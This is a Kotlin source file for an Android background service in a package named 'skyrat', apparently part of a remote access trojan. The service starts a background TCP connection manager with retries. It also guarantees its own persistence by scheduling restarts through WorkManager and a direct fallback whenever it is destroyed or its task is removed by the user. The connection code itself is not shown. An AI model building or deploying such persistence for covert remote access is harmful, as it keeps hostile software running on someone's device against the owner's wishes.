package com.techsky.skyrat

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.work.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.util.concurrent.TimeUnit

class MainService : Service() {

    companion object {
        private const val TAG = "MainServiceClass"
        private var isServiceRunning = false
        private const val RESTART_WORKER_TAG = "restart_worker"
    }

    private var backgroundManager: BackgroundTcpManager? = null

    override fun onBind(intent: Intent): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "MainService created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "MainService started with startId: $startId")

        if (isServiceRunning) {
            Log.d(TAG, "MainService already running, ignoring duplicate start")
            return START_STICKY
        }

        isServiceRunning = true

        // Start background TCP manager
        CoroutineScope(Dispatchers.IO).launch {
            try {
                delay(3000)
                Log.d(TAG, "Starting background TCP manager from MainService")
                backgroundManager = BackgroundTcpManager(applicationContext)
                backgroundManager?.startConnection()

            } catch (e: Exception) {
                Log.e(TAG, "Error starting background manager in MainService: ${e.message}", e)
                // Retry after delay
                delay(10000)
                try {
                    backgroundManager = BackgroundTcpManager(applicationContext)
                    backgroundManager?.startConnection()
                } catch (retryException: Exception) {
                    Log.e(TAG, "MainService retry failed: ${retryException.message}", retryException)
                }
            }
        }

        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "MainService destroyed - scheduling WorkManager restart")
        isServiceRunning = false

        // Clean up resources
        backgroundManager = null

        // FIXED: Use WorkManager instead of direct service restart
        scheduleServiceRestart()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.d(TAG, "Task removed - ensuring MainService continues via WorkManager")
        scheduleServiceRestart()
    }

    private fun scheduleServiceRestart() {
        try {
            // Use WorkManager for reliable background restart
            val restartRequest = OneTimeWorkRequestBuilder<ServiceRestartWorker>()
                .setInitialDelay(5, TimeUnit.SECONDS)
                .addTag(RESTART_WORKER_TAG)
                .setBackoffCriteria(
                    BackoffPolicy.EXPONENTIAL,
                    WorkRequest.MIN_BACKOFF_MILLIS,
                    TimeUnit.MILLISECONDS
                )
                .build()

            WorkManager.getInstance(applicationContext)
                .enqueueUniqueWork(
                    "service_restart",
                    ExistingWorkPolicy.REPLACE,
                    restartRequest
                )

            Log.d(TAG, "Service restart scheduled via WorkManager")

        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule restart via WorkManager: ${e.message}")
            // Fallback to direct BackgroundTcpManager
            fallbackRestart()
        }
    }

    private fun fallbackRestart() {
        CoroutineScope(Dispatchers.IO).launch {
            delay(10000) // Wait 10 seconds
            try {
                Log.d(TAG, "Fallback restart: Starting BackgroundTcpManager directly")
                val manager = BackgroundTcpManager(applicationContext)
                manager.startConnection()
            } catch (e: Exception) {
                Log.e(TAG, "Fallback restart failed: ${e.message}")
            }
        }
    }
}
